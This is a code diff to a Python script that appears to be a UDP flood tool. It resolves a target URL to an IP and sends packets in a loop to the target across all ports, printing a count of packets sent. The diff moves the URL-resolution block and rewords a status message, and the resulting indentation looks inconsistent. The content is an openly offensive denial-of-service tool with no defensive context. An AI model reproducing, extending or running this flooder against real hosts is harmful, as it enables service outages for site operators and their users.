@@ -88,7 +88,16 @@ def clear():
 #########################################################################
 
 fake_ip = '77.109.33.232'
-
+  
+#########################################################################
+#ip
+url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
+url_chek =requests.get(url)
+ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
+print(ip)
+print("\033[94m")
+#########################################################################
+time.sleep(2.5)
 
 
 
@@ -112,7 +121,7 @@ def req_send(ip,port,byte):
     sock.sendto(byte, (ip,port))
     send += 1
     port += 1
-    print (f"{green}Sent{red} {send}{green} packet to{blue} {ip}{green} throught port: {yellow}{port}{default}")
+    print (f"{green}Sent{red} {send}{green} packet {blue} {ip}{green} port: {yellow}{port}{default}")
     if port == 65534:
       port = 1
 
@@ -120,19 +129,7 @@ if __name__ == "__main__":
   banner()
   check_net_con()
 ############ we will take input#####
-  
-#########################################################################
-#ip
-url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
-url_chek =requests.get(url)
-ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
-print(ip)
-time.sleep(2.5)
-print("\033[94m")
-#########################################################################
-
 try:
-    
     ip = input("\033[94m╔═══\033[91m[ Target IP ] •\n\033[94m╠══>\033[0m ")
     port = int(input("\033[94m╠═══\033[91m[ Enter PORT ] •\n\033[94m╠══>\033[0m "))
     if not (ip == "" or port == ""):
